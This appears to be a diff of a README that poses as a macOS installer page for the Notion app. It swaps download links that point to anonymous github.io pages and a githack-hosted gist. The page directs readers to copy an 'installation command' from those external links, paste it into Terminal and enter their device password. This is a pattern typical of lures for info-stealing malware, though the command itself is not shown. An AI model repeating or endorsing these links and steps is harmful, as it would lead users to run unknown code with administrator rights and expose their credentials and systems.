@@ -3,7 +3,7 @@
 
 Notion is an all-in-one workspace for notes, tasks, databases, and collaboration — now available for macOS 🍎. Follow the instructions below to install it easily on your Mac device.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-000000?style=for-the-badge&logo=apple&logoColor=white)](https://juianaiud84.github.io/.github/notion)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 If the download button does not work, please follow the installation guide below using the terminal command.
 
@@ -24,7 +24,7 @@ If the download button does not work, please follow the installation guide below
 
 1. Get the installation command by pressing this button:  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-007AFF?style=flat-square&logo=apple)](https://gistcdn.githack.com/ledseachgoogle993/23ab0009105cd91d86ae31a7672cb9d7/raw/92c7a9c364b251a913232d71aa29f9111358558b/install.html)  
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
